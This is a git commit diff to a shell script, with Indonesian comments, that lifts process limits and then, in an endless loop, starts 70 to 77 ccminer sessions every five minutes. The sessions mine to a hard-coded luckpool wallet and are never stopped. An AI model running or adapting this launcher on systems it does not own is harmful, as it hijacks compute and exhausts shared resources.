7ac3ebd98ab55c210861a4f57acbd66991750e43
nadhirael <nadhiraelmayka@gmail.com>
2025-05-18 21:58:05 +0700

    Update ARM.sh

--- ARM.sh
+++ ARM.sh
@@ -20,14 +20,35 @@ echo "nambah limit sek bos"
 ulimit -u unlimited
 ulimit -n 100000
 
+#!/bin/bash
+
+# Fungsi menjalankan 1 miner
+run_miner() {
+    local id=$1
+    screen -dmS Miner_$id ./ccminer -a verus \
+        -o stratum+tcp://eu.luckpool.net:3957#xnsub \
+        -u REzE9WtQM5vfTU5ji5tLRWMfmYZmRevsXN \
+        -p x \
+        -t 1 \
+        --cpu-priority=5
+    echo "Miner_$id started"
+}
+
+# Loop selamanya
 while true; do
-   i=$(shuf -i 70-77 -n 1)  # Pilih angka acak antara 70-77
-   screen -dmS Miner_$i ./ccminer -a verus \
-      -o stratum+tcp://eu.luckpool.net:3957#xnsub \
-      -u REzE9WtQM5vfTU5ji5tLRWMfmYZmRevsXN -p x \
-      -t 1 --cpu-priority=5
-   echo "Sesi Miner_$i dibuat pada $(date)"
-   sleep 300  # Tunggu 5 menit sebelum membuat sesi baru
+    # Random jumlah miner antara 70–77
+    max_id=$((70 + RANDOM % 8))  # RANDOM % 8 menghasilkan 0-7
+    echo "[Loop] Menjalankan Miner_1 sampai Miner_$max_id dalam urutan acak..."
+
+    # Acak urutan miner
+    ids=($(shuf -i 1-$max_id))
+    for i in "${ids[@]}"; do
+        run_miner $i
+        sleep 0.1
+    done
+
+    echo "[Loop] Selesai. Tunggu 5 menit sebelum restart berikutnya..."
+    sleep 300
 done
 
 
